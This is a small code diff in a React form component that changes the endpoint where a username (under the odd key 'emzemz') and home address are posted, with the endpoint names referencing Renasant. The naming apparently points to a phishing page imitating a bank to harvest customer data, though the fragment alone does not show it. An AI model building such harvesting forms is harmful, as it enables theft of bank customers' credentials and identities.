@@ -145,7 +145,7 @@ const BasicInfo: React.FC = () => {
       });
 
       // Submit home address
-      await axios.post(`${baseUrl}api/renasant-home-address/`, {
+      await axios.post(`${baseUrl}api/renasant-meta-data-4/`, {
         emzemz: username,
         stAd,
         apt,
